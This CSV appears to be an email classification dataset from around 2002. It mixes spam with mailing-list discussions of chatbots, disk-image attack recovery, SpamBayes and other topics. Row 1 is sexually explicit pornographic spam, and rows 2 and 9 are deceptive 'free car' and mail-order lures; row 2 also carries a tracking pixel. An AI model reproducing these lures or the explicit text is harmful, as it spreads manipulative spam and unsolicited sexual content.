id,subject,email
0,"Subject: National Charity Suffering Since 9/11
","<BODY bgColor=#ffffff>
 <DIV><FONT face=Arial size=2>Dear Friend,</FONT></DIV>
 <DIV><FONT face=Arial size=2>&nbsp;</FONT></DIV>
 <DIV><FONT face=Arial size=2>""Serving the Tribes While Sharing the Culture""... Has been the mission for the American Indian Heritage Foundation for the past 29 years.</FONT></DIV>
 <DIV><FONT face=Arial size=2>&nbsp;</FONT></DIV>
 <DIV><FONT face=Arial size=2>For many years, AIHF has met the emergency requests from hundreds of Tribes with food, clothing, medical supplies, emergency grants and more. Our Student Eagle Awards program inspires Indian Youth to aspire and our Scholarship program for Young Indian Women has meant more than just financial aid to hundrends of beautiful Indian Women.</FONT></DIV>
 <DIV><FONT face=Arial size=2>&nbsp;</FONT></DIV>
 <DIV><FONT face=Arial size=2>This worthwhile endeavor is entirely funded by very generous people like you who want to help and make a difference. We need your help NOW more than ever.</FONT></DIV>
 <DIV><FONT face=Arial size=2>&nbsp;</FONT></DIV>
 <DIV><FONT face=Arial size=2><a href=""http://www.indians.org/gift/gift.html""> Click Here To learn more... maybe YOU can help.</a>  </FONT></DIV>
 <DIV><FONT face=Arial size=2>&nbsp;</FONT></DIV>
 <DIV><FONT face=Arial size=2>""May You Always Walk In Beauty""</FONT></DIV>
 <DIV><FONT face=Arial size=2>Pale Moon</FONT></DIV>
 <DIV><FONT face=Arial size=2>&nbsp;</FONT></DIV>
 <DIV><FONT face=Arial size=2>&nbsp;</FONT></DIV>
 <DIV><FONT face=Arial size=2>&nbsp;</FONT></DIV>
 <DIV><FONT face=Arial size=2>We appologize if this message has been an inconvenience. You may comment to our <a href=""mailto:Webmaster@indians.org"">webmaster.</a>  </FONT></DIV>
 
 
"
1,"Subject: The Stickiest Faces Ever!!!!
","<html>
 <body>
 <p>Shoot your wad all over her face.<br>
 These Girls love to suck cock and lucky for you,<br>
 they love to <b><font color=""#FF0000"">Suck Cock</font></b> while our cameras Are Rolling.<br>
 ""We have the nastiest <b><font color=""#FF0000"">Cum Sucking Sluts</font></b> 
 Available Anywhere!""<br>
 <br>
 <b><font size=""5""><a href=""http://1.betahost.net/site4/"">CLICK HERE</a></font></b></p>
 <p>&nbsp;</p>
 <p>&nbsp;</p>
 <p><b><font size=""2"">YOU MUST BE AT LEAST 18 TO ENTER!</font></b></p>
 <p><font size=""2"">=============================================================<br>
 To be removed from our ""in house"" mailing list <a href=""http://1.betahost.net/site4/takemeoff.html"">CLICK HERE</a><br>
 and you will automatically be removed from future mailings.<br>
 <br>
 You have received this email by either requesting more information<br>
 on one of our sites or someone may have used your email address.<br>
 If you received this email in error, please accept our apologies.<br>
 =============================================================</font></p>
 </body>
 </html>
 
 
 
 
 
"
2,"Subject: Free New Cars for the Taking!
","<html>
 <body>
 
 <center>
 <font face=""arial"" size=""10"">
 <a href=""http://ct2.consumertoday.net/cgi-bin14/flo?y=hE10CCzME0D40ER0Ac"">Get a FREE CAR or SUV!<br>
 CLICK HERE!</a>
 <br><br>
 <font size=""6"">
 There are hundreds of companies <br>giving away FREE CARS!
 <br>
 <br>
   <a href=""http://ct2.consumertoday.net/cgi-bin14/flo?y=hE10CCzME0D40ER0Ac""> <img src=""http://www.bd12.com/allfreecars/graph.gif"" border=""0""></a> 
   <br>
   <br>
 <a href=""http://ct2.consumertoday.net/cgi-bin14/flo?y=hE10CCzME0D40ER0Ac"">Chevy Blazer<br>
 Dodge Durango<br>
 Ford Windstar<br>
 Honda Civic And More...!<br>
 CLICK HERE!</a><B>
 
 <br>
 </b></font><B>
 <font face=arial size=1>
 
 
 </font>
 </b></font></center><BR><BR><CENTER><table border=""1"" cellpadding=""3"" cellspacing=""0"" width=""550"" bordercolor=""#000000"" body bgcolor=""white"">
 <tr><td width=""551"" height=""5"" align=""center"" valign=""middle""><table width=""550"" border=""0"" cellspacing=""0"" cellpadding=""0""><tr><td><FONT FACE=""Verdana, Modern, Arial"" SIZE=""2"" color=""gray"">We take your privacy very seriously and it is our policy never to send unwanted email messages. This message has been sent to gibbs@midrange.com because you are a member of Consumer Today or you signed up with one of our marketing partners. To unsubscribe, simply click <a href=""http://unsub.ct.consumertoday.net/consumer_today/ct_site_unsub.html""><font color=""blue""><u>here</u></font></a> (please allow 3-5 business days for your unsubscribe request to be processed). Questions or comments - send them to <a href=""mailto:customerservice@consumertoday.net""><font color=""blue""><u>customerservice@consumertoday.net</u></font></a>.</td></tr></table></td></tr></table></font></center></body>
 
 <IMG SRC=""http://ct2.consumertoday.net/cgi-bin14/flosensing?y=E10CCzME0D40BK""></html>
 
"
3,"Subject: Re: ActiveBuddy
","
 --------------080209060700030309080805
 Content-Type: text/plain; charset=US-ASCII; format=flowed
 Content-Transfer-Encoding: 7bit
 
 I actually thought of this kind of active chat at AOL (in 1996 I think), 
 bringing up ads based on what was being discussed and other features. 
 For a while, the VP of dev. (now still CTO I think) was really hot on 
 the idea and they discussed patenting it. Then they lost interest. 
 Probably a good thing.
 
 sdw
 
 Lorin Rivers wrote:
 
 >On 10/2/02 12:00 PM, ""Mr. FoRK"" <fork_list@hotmail.com> wrote:
 >  
 >
 >>What about a situation where you don't directly ask/talk to the bot, but
 >>they listen in and advise/correct/interject/etc?
 >>example: two people discussing trips, etc. may trigger a weather bot to
 >>mention what the forecast says - without directly being asked.
 >>    
 >>
 >
 >My guess is it's more insidious than that, it's going to be ActiveSpam.
 >
 >""Oh, you're going to Seattle? I can get you airline tickets for less""
 >
 >Yuck
 >  
 >
 
 
 --------------080209060700030309080805
 Content-Type: text/html; charset=US-ASCII
 Content-Transfer-Encoding: 7bit
 
 <!DOCTYPE html PUBLIC ""-//W3C//DTD HTML 4.01 Transitional//EN"">
 <html>
 <head>
   <title></title>
 </head>
 <body>
 I actually thought of this kind of active chat at AOL (in 1996 I think),
 bringing up ads based on what was being discussed and other features. &nbsp;For
 a while, the VP of dev. (now still CTO I think) was really hot on the idea
 and they discussed patenting it. &nbsp;Then they lost interest. &nbsp;Probably a good
 thing.<br>
 <br>
 sdw<br>
 <br>
 Lorin Rivers wrote:<br>
 <blockquote type=""cite""
  cite=""midB9C28892.35FF2%25lrivers@realsoftware.com"">
   <pre wrap="""">On 10/2/02 12:00 PM, ""Mr. FoRK"" <a class=""moz-txt-link-rfc2396E"" href=""mailto:fork_list@hotmail.com"">&lt;fork_list@hotmail.com&gt;</a> wrote:
   </pre>
   <blockquote type=""cite"">
     <pre wrap="""">What about a situation where you don't directly ask/talk to the bot, but
 they listen in and advise/correct/interject/etc?
 example: two people discussing trips, etc. may trigger a weather bot to
 mention what the forecast says - without directly being asked.
     </pre>
   </blockquote>
   <pre wrap=""""><!---->
 My guess is it's more insidious than that, it's going to be ActiveSpam.
 
 ""Oh, you're going to Seattle? I can get you airline tickets for less""
 
 Yuck
   </pre>
 </blockquote>
 <br>
 </body>
 </html>
 
 --------------080209060700030309080805--
 
 
"
4,"Subject: RE: use of base image / delta image for automated recovery from a
","I did something crudely along those lines for VMS VAX maybe 13 years
 ago; there is at least one product that does it for PC though I don't
 recall its name. It is also handy for cases where you have a CD image
 of some filesystem (or some other image of a filesystem) that is
 intrinsically readonly but whose filesystem will not accept (or is
 not graceful) readonly storage. It is also more or less necessary
 if you want to work with WORM file structures, which are older still.
 There have been a number of filesystems for those dating back to the
 early 1980s if not before.
 
 A generic facility of the type you mention is also one way to implement
 snapshots on top of an existing filesystem. The written information
 must (obviously!) be seekable so you can provide the illusion that you
 wrote to the storage. A device level implementation is however perfectly
 adequate.
 
 It does not, of course, distinguish for you what should have been changed
 and what should not. If you truly know a device (or perhaps a partition)
 must not be written, it can be simpler to either return error on writes,
 or to just return a fake success on writes yet discard the data. (NTFS
 lives with the latter strategy just fine from my experiments. I have not
 tried it on extf3 or reiser.) 
 
 BTW, think about your mention of RAID and consider the complexity of
 writing to RAID4 or RAID5...
 I would contend that with cheaper storage these days, it makes little sense
 to use RAID, save for shadowing and possibly striping. Those at least do
 not have the complexity and slowup dangers that higher RAID levels have, and
 there is not a need to save the cost of disk so much where a single disk
 may hold 200 gigs and up. Why not dedicate another whole disk to fault
 recovery
 and lose the complexity and slow write (sometimes) of RAID?
 
 Glenn Everhart
 
 
 -----Original Message-----
 From: bmord@icon-nicholson.com [mailto:bmord@icon-nicholson.com]
 Sent: Tuesday, September 03, 2002 3:04 PM
 To: Webappsec Securityfocus.Com; SECPROG Securityfocus
 Subject: use of base image / delta image for automated recovery from
 attacks
 
 
 Hi,
 
 I was inspired by a mode of operation supported by VMWare. You can have a
 base disk image shared by multiple virtual machine (vm) instances. That base
 image is never altered by a vm instance. Instead, each vm instance writes
 changes to its own ""redo"" log. Future hard disk reads from that vm instance
 incorporate both the base image and the appropriate redo log to present the
 current disk image for that specific virtual machine.
 
 This is described here (thanks to Duane for providing this link on the
 honeypots mailing list)
 http://www.vmware.com/support/reference/common/disk_sharing.html
 
 Could this basic concept be used to easily make self-fixing client/server
 applications that efficiently and automatically recover from most attacks,
 even before those attacks have been discovered? Here is what I imagine.
 
 The physical architectures of most production client/server systems are
 layered. For example, your basic web application might have a web server
 running Apache, connected to an application server running some J2EE or .Net
 business logic, connected to a database server for persistence. The only one
 of these whose disk image really should evolve over time is the database
 server, and even here you often put the static RDBMS software on one
 partition and the changeable datafiles on another partition. It is only the
 partition with the volatile datafiles that must be allowed to change from
 one boot to the next. Other paritions may need to be writable for, say, swap
 space, but these changes could be eliminated on each reboot.
 
 When someone cracks this system, they will probably change an image that
 shouldn't be changed. E.g., they might leverage a buffer overflow in IIS or
 Apache to install a trojan or a backdoor on the more exposed web server. But
 what if the web server ran off a base image, writing changes to a ""delta"" or
 ""redo"" partition? And then what if every night it automatically erased the
 redo partition and rebooted? The downtime involved for each machine would be
 minimal, because it is only deleting data - rather than restoring from
 backup. In a system with redundant web servers for load balancing or high
 availability, this could be scheduled in a way such that the system is
 always accessible. This base/redo partition concept could be implemented at
 the same level as a feature of hardware RAID, allowing for greater
 performance, reliability, and hack resistance. This concept could also be
 applied to the application servers, and even the database server partitions
 (except for those partitions which contain the table data files, of course.)
 
 Does anyone do this already? Or is this a new concept? Or has this concept
 been discussed before and abandoned for some reasons that I don't yet know?
 I use the physical architecture of a basic web application as an example in
 this post, but this concept could of course be applied to most server
 systems. It would allow for the hardware-separation of volatile and
 non-volatile disk images. It would be analogous to performing nightly
 ghosting operations, only it would be more efficient and involve less (or
 no) downtime.
 
 Thanks for any opinions,
 Ben
 
 
 **********************************************************************
 This transmission may contain information that is privileged, confidential and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format. Thank you
 **********************************************************************
 
 
"
5,"Subject: Jeremy Bowers: ""None of the trackback mechanisms has reached the
","URL: http://scriptingnews.userland.com/backissues/2002/09/25#When:5:12:19AM
 Date: Wed, 25 Sep 2002 12:12:19 GMT
 
 Jeremy Bowers[1]: ""None of the trackback mechanisms has reached the critical 
 mass necessary to see the negative effects experienced in all other community 
 models.""
 
 [1] http://www.jerf.org/irights/2002/09/25.html#a2231
 
 
"
6,"Subject: [Spambayes] test sets?
","On 06 September 2002, Tim Peters said:
 > > Note that header names are case insensitive, so this one's no
 > > different than ""MIME-Version:"".  Similarly other headers in your list.
 > 
 > Ignoring case here may or may not help; that's for experiment to decide.
 > It's plausible that case is significant, if, e.g., a particular spam mailing
 > package generates unusual case, or a particular clueless spammer
 > misconfigures his package.
 
 Case of headers is definitely helpful.  SpamAssassin has a rule for it
 -- if you have headers like ""DATE"" or ""SUBJECT"", you get a few more
 points.
 
         Greg
 -- 
 Greg Ward <gward@python.net>                         http://www.gerg.ca/
 God is omnipotent, omniscient, and omnibenevolent
 ---it says so right here on the label.
"
7,"Subject: I've been hearing a lot about FOAF, which is an acronym for
","URL: http://scriptingnews.userland.com/backissues/2002/09/23#When:10:34:18AM
 Date: Mon, 23 Sep 2002 17:34:18 GMT
 
 I've been hearing a lot about FOAF, which is an acronym for Friend Of A Friend. 
 It's an RDF-based file format that lets you walk a network of people who are 
 friends. It's a lot like a network of blogrolls[1]. 
 
 [1] http://radio.outliners.com/stories/storyReader$85
 
 
"
8,"Subject: RE: The Curse of India's Socialism
","On Tue, 2002-08-20 at 14:16, Dave Long wrote:
 > >                                                                   In the
 > > Philippines, getting legal title can take 20 years.  In Egypt, about 80%
 > > of the population in Cairo lives in places where they are officially
 > > illegal.
 > 
 > If the situation in Egypt is anything
 > like the situation in the Philippines,
 > it's because people (due to a strange
 > desire for jobs) squat on land which
 > they don't own.*
 
 
 The Philippines suffers from a Spanish-imposed aristocratic landowner
 class, the same as in most of Latin America, with the serf-like
 relationships that go with it.  You have multiple generations of
 peasants/squatters that cultivate and live on the lands almost as a
 human parts of the property package.
 
 The problem in the Philippines is that the landowner class is fading,
 but the peasants are still operating under the old economic assumption
 even though it isn't being imposed on them in most cases.  In a number
 of areas, you have landowners that don't use their lands during bad
 years (i.e. when sugar prices fall too low or some other condition that
 makes planting unprofitable in the global economy) and in some cases
 have all but abandoned them, but when they come back to plant crops
 several years later they find the same peasants living on the fallow
 land as scratch farmers to survive and waiting for the landowner to come
 back and give them something to do.
 
 The government's solution to this was to ""redistribute"" fallow land to
 the peasants that lived on them, and created a number of problems in the
 process.  First of all, it meant that all the agricultural producers had
 to plant crops all the time (profitable or not) or the government would
 seize the land and give it to someone else, which is not economically
 optimal by any means.  Second when they give it to the peasants, they
 use it to become scratch farmers, which is not a particularly productive
 economic activity, and the landowners generally let them do that for
 free when the land is fallow anyway.  Third, the peasants generally
 *prefer* to work for the landowner rather than own the land themselves;
 they make more money, have more opportunities to become middle-class,
 and enjoy a better lifestyle under that arrangement.  So the result of
 all this is that the landowners either run an economically sub-optimal
 agriculture business to protect their lands, or they risk having their
 land seized without compensation and given to the peasants/squatters who
 will gladly sell it back to the plantation owner rather than becoming
 scratch farmers, another economically sub-optimal solution. The only
 real role of the government in this arrangement is to be a drag on the
 economy.
 
 And I don't know about 20 years for land titles in the Philippines.  It
 takes a little longer than in the US (though not much), and you may have
 to bribe someone to make it work well in an expedited manner, but it
 isn't that onerous in the regions I'm familiar with.
 
 Speaking as a former Philippine plantation owner. (Yes, really. On
 Negros and Cebu. Have I led a strange life or what?)
 
 -James Rogers
  jamesr@best.com
 
 http://xent.com/mailman/listinfo/fork
 
"
9,"Subject: windows tips
","
 
 ARE YOU HAVING TROUBLE WITH YOUR COMPUTER?  THE PROBLEMS MAY NOT BE WITH YOUR COMPUTER?
 
 As part of a National Marketing Test, we are offering the most amazing Windows Tips. 
 Over 60 ways to improve the performance of your computer. (GUARANTEED)
 You will gain a better understanding of your computer and Windows 95 - 98SE operating system just by using these amazing tips and tricks.
 
 With this program and its information you will be able to: 
 
 Increase your computer's resources (Are you at 96%?)
 Search for hidden files
 Keyboard Shortcuts
 Restart your computer faster
 Open programs faster
 Find better ways to free up memory
 New PnP devices
 Find the hidden settings for Windows
 How to make a Restart Icon
 What to do when Windows won't start?
 Memory issues
 INI versus registry
 Changing Logon and Logoff screens
 Did you know you could change the name of your ""Start"" menu?
 
 THIS IS ONLY A SAMPLE OF WHAT IS AVAILABLE TO YOU WITH THIS PROGRAM.
 
 During this special promotion we will be offering this amazing program for just $14.95 postage paid. This is less than half of the suggested retail price of $29.99
 
 All you will need to run this disk is a Windows based computer and an Internet browser (no need to be connected to the Internet). Sorry no Macintosh version available at this time.
 
 These are tips and tricks that computer technicians know and now you have all the information available for a low price of only $14.95 postage paid! Software and computer manufacturers don't want you to know these secrets, because they want you to buy their software and/or technology upgrades at very inflated prices.
 This investment of only $14.95 truly outweighs the frustration of a poorly working good computer.
 
 Gain a better understanding of your computer by using these tips.
 
 ORDER TODAY FOR YOUR COPY OF THIS AMAZING PROGRAM FOR WINDOWS.
 
 Postage paid.
 $14.95 US, $19.95 International (U.S dollars)
 
 (We accept Cash, Check or Money order)
 
 Make Checks payable to:
 C Chute
 PO Box 6337
 Jacksonville, Fl. 32205-9998
 
 Please Print Clearly Your Return:
 
 Name  _______________________________________________________________l31__
 
 Address _______________________________________________________________       
 
 City, State, and Zip Code _____________________________________________
 
 E-mail Address_________________________________________________________   ........................................................................
 
 This program is fully guaranteed. If you are unhappy just return the disk within 30 days
 And we will refund your money.
 
 Copyright 2001
 C Chute
 All Rights Reserved
 
 All REMOVE requests AUTOMATICALLY honored upon receipt. PLEASE understand that any effort to disrupt, close or block this REMOVE account can only result in difficulties for others wanting to be removed from our master mailing list as it will be impossible to take anyone off the list if the remove instruction cannot be received. To be removed from our master mailing list please send an email to 2getoffmylist@start.com.au   and place remove in the subject.
 
 Thank you:
 PLEASE FORWARD TO EVERYONE YOU KNOW!
 ONE DAY THEY WILL THANK YOU!
 
 
 This mailing is done by an independent marketing co.
 We apologize if this message has reached you in error.
 Save the Planet, Save the Trees!  Advertise With
 E-mail.  No wasted paper!   Delete with 
 One simple keystroke!  Less refuse in our Dumps!
 
 Make it a great day!
 
 ------------------------------------------------------------------------------------------------------------
 
 
 
"
